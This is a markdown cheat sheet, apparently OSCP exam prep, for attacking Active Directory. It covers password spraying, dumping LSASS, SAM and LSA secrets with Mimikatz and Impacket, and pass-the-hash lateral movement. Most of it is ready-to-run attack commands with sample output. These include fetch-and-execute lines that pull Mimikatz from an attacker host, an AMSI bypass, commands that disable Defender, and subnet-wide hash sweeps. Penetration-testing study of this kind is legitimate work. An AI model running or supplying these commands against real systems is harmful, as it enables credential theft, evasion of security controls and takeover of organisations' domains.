# Active Directory
## Password Spraying + Mimikatz + Pass-the-Hash

> **Legend:**
> `[KALI]` = Run on Kali (attack machine)
> `[WINDOWS]` = Run on Windows (victim/foothold)

---

## STEP 1 — Password Policy Check (ALWAYS FIRST)

### NetExec
`[KALI]`
```bash
nxc smb DC_IP --pass-pol
nxc smb DC_IP -u '' -p '' --pass-pol
```

### rpcclient
`[KALI]`
```bash
rpcclient -U "" -N DC_IP -c "getdompwinfo"
```

### Output to Read
```
Minimum password length: 7
Account lockout threshold: 3       ← CRITICAL
Account lockout duration: 30 mins  ← Wait this long between rounds
Reset account lockout counter: 30 mins
```

### Spray Strategy Based on Threshold
| Threshold | Max Attempts Per User | Wait Between Rounds |
|-----------|----------------------|---------------------|
| 0 | Unlimited | No wait |
| 3 | **2 max** | 30+ mins |
| 5 | **3-4 max** | 30+ mins |
| 10 | **7-8 max** | Per obs. window |

---

## STEP 2 — Password Spraying

### Common Passwords for OSCP Labs
```
Password1        Password123      Password123!
Welcome1         Welcome123       Welcome@123
Winter2024       Summer2024!      Spring2024
Corp@123         Company1!        [username]123
[CompanyName]1   [CompanyName]!1  January2024!
```

### NetExec SMB Spray
`[KALI]`
```bash
# Single password all users
nxc smb DC_IP -u userlist.txt -p 'Password123!' --continue-on-success

# With domain
nxc smb DC_IP -u userlist.txt -p 'Password123!' -d corp.local --continue-on-success

# Multiple passwords — no bruteforce flag (one password per user at a time)
nxc smb DC_IP -u userlist.txt -p passwords.txt --no-bruteforce --continue-on-success

# Local accounts spray
nxc smb DC_IP -u userlist.txt -p 'Password123!' --local-auth --continue-on-success
```

### Output Reading
```
SMB  DC_IP  445  DC01  [-] corp\john.doe:Password123!  STATUS_LOGON_FAILURE   ← Wrong
SMB  DC_IP  445  DC01  [+] corp\jsmith:Password123!                           ← VALID!
SMB  DC_IP  445  DC01  [+] corp\asmith:Password123! (Pwn3d!)                  ← LOCAL ADMIN!
SMB  DC_IP  445  DC01  [-] corp\bking:Password123!  STATUS_ACCOUNT_LOCKED_OUT ← STOP NOW!
```

> `(Pwn3d!)` = Local admin on that machine → run secretsdump immediately

### Kerbrute Spray (Stealthier)
`[KALI]`
```bash
kerbrute passwordspray \
  -d corp.local \
  --dc DC_IP \
  userlist.txt \
  'Password123!'
```

### WinRM + RDP Spray
`[KALI]`
```bash
# WinRM — if valid gives shell via evil-winrm
nxc winrm 192.168.1.0/24 -u userlist.txt -p 'Password123!' --continue-on-success

# RDP spray
nxc rdp 192.168.1.0/24 -u userlist.txt -p 'Password123!' --continue-on-success
```

---

## STEP 3 — Credential Locations on Windows

```
Windows Machine
├── SAM          → C:\Windows\System32\config\SAM      (local users only)
├── LSASS        → lsass.exe in memory                 (all logged-in users)
├── Registry     → HKLM\...\Winlogon                   (autologon creds)
└── NTDS.dit     → C:\Windows\NTDS\ntds.dit (DC only)  (ALL domain hashes)
```

### Registry Autologon Check
`[WINDOWS]`
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**If found:**
```
DefaultUserName    REG_SZ    Administrator
DefaultPassword    REG_SZ    SuperSecret123!    ← PLAINTEXT PASSWORD
DefaultDomainName  REG_SZ    CORP
```

### Other Registry Credential Spots
`[WINDOWS]`
```cmd
# Putty saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# VNC passwords
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# Windows autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# SNMP community string
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```

---

## STEP 4 — Mimikatz

### Setup — Upload to Target
`[KALI]`
```bash
# Start python server
python3 -m http.server 80

# Via evil-winrm
evil-winrm -i VICTIM_IP -u username -p 'password'
*Evil-WinRM* PS> upload /opt/mimikatz.exe C:\Temp\mimikatz.exe
```

`[WINDOWS]`
```cmd
# Via certutil
certutil -urlcache -split -f http://KALI_IP/mimikatz.exe C:\Temp\mimikatz.exe

# Via PowerShell
(New-Object Net.WebClient).DownloadFile('http://KALI_IP/mimikatz.exe','C:\Temp\mimikatz.exe')
```

### AMSI Bypass + Defender Disable
`[WINDOWS]`
```powershell
# AMSI bypass (run first in PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Disable Defender realtime (needs admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable all Defender features
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true
```

### Invoke-Mimikatz (fileless — no exe needed)
`[WINDOWS]`
```powershell
# Download and run in memory
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

---

### Mimikatz Command 1 — privilege::debug
`[WINDOWS]`
```
mimikatz # privilege::debug
```
```
Output: Privilege '20' OK    ← Must see this before anything else
```
> Enables SeDebugPrivilege — without this LSASS access is denied

---

### Mimikatz Command 2 — sekurlsa::logonpasswords ⭐ MOST IMPORTANT
`[WINDOWS]`
```
mimikatz # sekurlsa::logonpasswords
```

**Full Output Example:**
```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/15/2024 9:00:00 AM
SID               : S-1-5-21-1234567890-500

        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4    ← COPY THIS
         * SHA1     : aad3b435b51404eeaad3b435b51404ee

        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : (null)    ← Win10+ always null. Win7/2008 = PLAINTEXT

        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)

        ssp :   KO
        credman :
```

> **What to copy:** The `NTLM` hash value — use it for PtH attacks

---

### Mimikatz Command 3 — sekurlsa::tickets
`[WINDOWS]`
```
mimikatz # sekurlsa::tickets /export
```
```
[00000000] - 0x00000012 - aes256_hmac
   Server Name : krbtgt/CORP.LOCAL
   Client Name : Administrator @ CORP.LOCAL
   * Saved to file: [0;123456]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
```
> `.kirbi` files = Kerberos tickets → used in Pass-the-Ticket (Part 3)

---

### Mimikatz Command 4 — lsadump::sam
`[WINDOWS]`
```
mimikatz # lsadump::sam
```
```
Domain : WS01
SysKey : 1234abcd5678efgh...

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4

RID  : 000003e8 (1000)
User : localadmin
  Hash NTLM: aabbccdd11223344aabbccdd11223344    ← Local account
```
> Local accounts only — no domain accounts here

---

### Mimikatz Command 5 — lsadump::dcsync (DC only / Part 3)
`[WINDOWS]`
```
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```
> Replicates DC to get any user's hash. Needs DCSync rights. Covered in Part 3.

---

### All Mimikatz in One Shot
`[WINDOWS]`
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export
mimikatz # lsadump::sam
mimikatz # lsadump::cache
mimikatz # exit
```

---

## STEP 5 — Impacket secretsdump (Remote)

### With Password
`[KALI]`
```bash
impacket-secretsdump corp.local/Administrator:Password123!@VICTIM_IP
```

### With NT Hash (PtH style)
`[KALI]`
```bash
impacket-secretsdump corp.local/Administrator@VICTIM_IP \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4
```

### Local Accounts Only
`[KALI]`
```bash
impacket-secretsdump Administrator:Password123!@VICTIM_IP -sam
```

### Output
```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
localadmin:1000:aad3b435b51404eeaad3b435b51404ee:aabbccdd11223344aabbccdd11223344:::

[*] Dumping cached domain logon information
CORP/jsmith:$DCC2$10240#jsmith#abc123hash...    ← Cached domain creds

[*] Dumping LSA Secrets
_SC_MSSQLSERVER:MSSQLServicePass123!            ← Service account plaintext!
CORP\svc_sql:SqlAdmin2024!
```

> **Output format:** `username:RID:LM_hash:NT_hash:::`
> Only NT hash (after second colon) needed for PtH

---

## STEP 6 — reg save (Offline SAM Dump)

### Save Registry Hives
`[WINDOWS]`
```cmd
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak
reg save HKLM\SECURITY C:\Temp\security.bak
```

### Download to Kali
`[WINDOWS → KALI]`
```powershell
# Via evil-winrm
*Evil-WinRM* PS> download C:\Temp\sam.bak /tmp/sam.bak
*Evil-WinRM* PS> download C:\Temp\system.bak /tmp/system.bak
*Evil-WinRM* PS> download C:\Temp\security.bak /tmp/security.bak
```

### Crack Offline
`[KALI]`
```bash
impacket-secretsdump \
  -sam /tmp/sam.bak \
  -system /tmp/system.bak \
  -security /tmp/security.bak \
  LOCAL
```

---

## STEP 7 — Pass-the-Hash (PtH)

```
Normal:   Password → NT Hash → NTLM Auth → Access
PtH:                 NT Hash → NTLM Auth → Access ✅
```
> NTLM protocol uses hash internally — so hash = password for authentication

### NetExec PtH — Find All Admin Access
`[KALI]`
```bash
# Single machine
nxc smb VICTIM_IP -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# Sweep entire subnet — find all machines where hash works
nxc smb 192.168.1.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# LM:NT format
nxc smb VICTIM_IP -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# With domain
nxc smb VICTIM_IP -u Administrator -H NTHASH -d corp.local
```

---

### psexec.py — SYSTEM Shell
`[KALI]`
```bash
impacket-psexec corp.local/Administrator@VICTIM_IP \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4
```
```
C:\Windows\system32> whoami
nt authority\system
```
> Noisy — creates a service. AV may trigger. Gets SYSTEM.

---

### wmiexec.py — Quieter Shell (Preferred)
`[KALI]`
```bash
impacket-wmiexec corp.local/Administrator@VICTIM_IP \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4
```
```
C:\> whoami
corp\administrator
```
> Uses WMI — no service created. Preferred over psexec.

---

### smbexec.py — Fallback
`[KALI]`
```bash
impacket-smbexec corp.local/Administrator@VICTIM_IP \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4
```
> Use when psexec and wmiexec both fail.

---

### atexec.py — Single Command (No Shell)
`[KALI]`
```bash
impacket-atexec corp.local/Administrator@VICTIM_IP \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4 \
  "whoami"

impacket-atexec corp.local/Administrator@VICTIM_IP \
  -hashes :32ed87bdb5fdc5e9cba88547376818d4 \
  "ipconfig /all"
```

---

### evil-winrm — Best Shell (Port 5985)
`[KALI]`
```bash
evil-winrm -i VICTIM_IP -u Administrator \
  -H 32ed87bdb5fdc5e9cba88547376818d4
```
```powershell
*Evil-WinRM* PS C:\Users\Administrator> whoami
corp\administrator

# Upload file
*Evil-WinRM* PS> upload /opt/mimikatz.exe C:\Temp\mimikatz.exe

# Download file
*Evil-WinRM* PS> download C:\Temp\loot.txt /tmp/loot.txt
```

---

### PtH Tools Comparison

| Tool | Shell | Noise | Port Needed | Use When |
|------|-------|-------|-------------|----------|
| psexec | SYSTEM interactive | 🔴 High | 445 | Need SYSTEM |
| wmiexec | Admin semi-interactive | 🟡 Medium | 445 | Default choice |
| smbexec | Admin semi-interactive | 🟡 Medium | 445 | psexec/wmi fail |
| atexec | Single command | 🟢 Low | 445 | Quick command |
| evil-winrm | PowerShell interactive | 🟡 Medium | 5985 | WinRM open |

---

## STEP 8 — Overpass-the-Hash (OPtH)

> Convert NT Hash → Kerberos TGT → use Kerberos auth where NTLM is blocked

### Mimikatz
`[WINDOWS]`
```
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
```
> Opens new cmd.exe with target user's Kerberos context

### Rubeus
`[WINDOWS]`
```powershell
# Request TGT and inject into memory
Rubeus.exe asktgt /user:Administrator /rc4:32ed87bdb5fdc5e9cba88547376818d4 /ptt

# Verify ticket injected
klist
```

---

## STEP 9 — Post-Credential Workflow

### Got Password → Do This
`[KALI]`
```bash
# 1. Validate on all hosts
nxc smb 192.168.1.0/24 -u username -p 'password' -d corp.local

# 2. Pwn3d! hosts → secretsdump
impacket-secretsdump corp.local/username:password@PWND_IP

# 3. Check WinRM
nxc winrm 192.168.1.0/24 -u username -p 'password'

# 4. Get shell
evil-winrm -i PWND_IP -u username -p 'password'
```

### Got NT Hash → Do This
`[KALI]`
```bash
# 1. Sweep all hosts
nxc smb 192.168.1.0/24 -u Administrator -H NTHASH

# 2. Crack it too
hashcat -m 1000 NTHASH /usr/share/wordlists/rockyou.txt

# 3. Shell via wmiexec
impacket-wmiexec corp.local/Administrator@VICTIM_IP -hashes :NTHASH

# 4. Shell via evil-winrm
evil-winrm -i VICTIM_IP -u Administrator -H NTHASH
```

---

## STEP 10 — Complete Attack Scenarios

### Scenario A — Domain User, Not Admin
```bash
# Have: svc_backup:Password123! (domain user, no admin)

# [KALI] Step 1 — Kerberoast with these creds
impacket-GetUserSPNs corp.local/svc_backup:Password123! \
  -dc-ip DC_IP -request -outputfile kerb.txt

# [KALI] Step 2 — Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# [KALI] Step 3 — Validate new creds
nxc smb 192.168.1.0/24 -u svc_sql -p 'SQLpass2024!' -d corp.local

# [KALI] Step 4 — Pwn3d! → secretsdump
impacket-secretsdump corp.local/svc_sql:SQLpass2024!@PWND_IP
```

### Scenario B — Local Admin Hash on WS01
```bash
# Have: Administrator NTLM hash on WS01

# [KALI] Step 1 — Shell
evil-winrm -i WS01_IP -u Administrator -H NTHASH

# [WINDOWS] Step 2 — AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# [WINDOWS] Step 3 — Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# [WINDOWS] Step 4 — Run mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# [KALI] Step 5 — New hash sweep
nxc smb 192.168.1.0/24 -u jsmith -H NEW_HASH
```

### Scenario C — PtH on 3 Machines → DC
```bash
# Have: jdoe:Welcome1! — local admin on WS01, WS02, WS03

# [KALI] Step 1 — Dump all 3
impacket-secretsdump corp.local/jdoe:Welcome1!@WS01_IP
impacket-secretsdump corp.local/jdoe:Welcome1!@WS02_IP
impacket-secretsdump corp.local/jdoe:Welcome1!@WS03_IP

# Step 2 — Collect all NT hashes from output

# [KALI] Step 3 — Try each hash on DC
nxc smb DC_IP -u Administrator -H HASH1
nxc smb DC_IP -u Administrator -H HASH2
nxc smb DC_IP -u jsmith -H HASH3

# [KALI] Step 4 — Pwn3d! on DC → shell + full dump
impacket-wmiexec corp.local/Administrator@DC_IP -hashes :WORKING_HASH
impacket-secretsdump corp.local/Administrator@DC_IP -hashes :WORKING_HASH
```

---

## STEP 11 — BloodHound Post-Exploitation

```bash
# After every new credential:
# 1. Mark as Owned in BloodHound
# 2. Run: Shortest Path from Owned Principals
# 3. Check for new edges:

AdminTo        → PtH/secretsdump here
HasSession     → DA logged in → steal ticket
GenericAll     → Full object control
WriteDACL      → Modify permissions
DCSync         → Dump all domain hashes
```

---

## Notes Format — OSCP Report

```
[Username]     : [Password / NT Hash]              : [Machine]  : [Privilege]   : [Source]
jdoe           : Welcome1!                         : WS01,WS02  : Local Admin   : AS-REP Roast
Administrator  : :32ed87bdb5fdc5e9cba88547376818d4 : DC01        : Domain Admin  : secretsdump
svc_sql        : SQLpass2024!                      : Domain      : Domain User   : Kerberoast
localadmin     : :aabbccdd11223344aabbccdd11223344  : WS01        : Local Admin   : Mimikatz SAM
```

---

## Quick Reference — Hash Formats

```
secretsdump output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
              RID  LM (ignore)                       NT (use this) ←

PtH command:
-hashes :32ed87bdb5fdc5e9cba88547376818d4        ← colon then NT only
-hashes aad3b435...:32ed87bdb5fdc5e9cba88547376818d4  ← LM:NT format

Why LM blank:
LM is disabled on Win Vista+ — always aad3b435... (blank LM)
Only NT hash is needed for PtH — LM part is ignored by modern Windows
```

---

## Common Errors + Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `STATUS_LOGON_FAILURE` | Wrong pass/hash | Check credentials |
| `STATUS_ACCOUNT_LOCKED_OUT` | Too many attempts | Wait for lockout duration |
| `STATUS_ACCESS_DENIED` | Not admin | Need admin on that machine |
| `[-] LSASS not running` | Process killed | Try secretsdump remotely |
| `Mimikatz - LSASS access denied` | No SeDebugPrivilege | Run `privilege::debug` first |
| `NTLMSSP_AUTH Error` | SMB signing enforced | Use Kerberos or find plaintext |
| `impacket connection refused` | Port closed | Check port with nmap |

---

## Tools Install Check

`[KALI]`
```bash
which nxc crackmapexec kerbrute impacket-secretsdump evil-winrm

# Install netexec
pip install netexec

# Install evil-winrm
sudo gem install evil-winrm

# Install impacket
pip install impacket
sudo apt install python3-impacket

# Download mimikatz (for upload to target)
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip mimikatz_trunk.zip -d /opt/mimikatz/
```

---

## TryHackMe Practice Rooms

| Room | Covers |
|------|--------|
| Attacktive Directory | Full AD chain |
| Post-Exploitation Basics | Mimikatz, credential harvesting |
| Hacking with PowerShell | PowerShell attacks |
| Lateral Movement and Pivoting | PtH, lateral movement |
| VulnNet: Active | Kerberoasting + credential abuse |

---

*Part 2B — Password Spraying + Mimikatz + Pass-the-Hash*
*Next → Part 3: Lateral Movement + DCSync + Domain Admin*
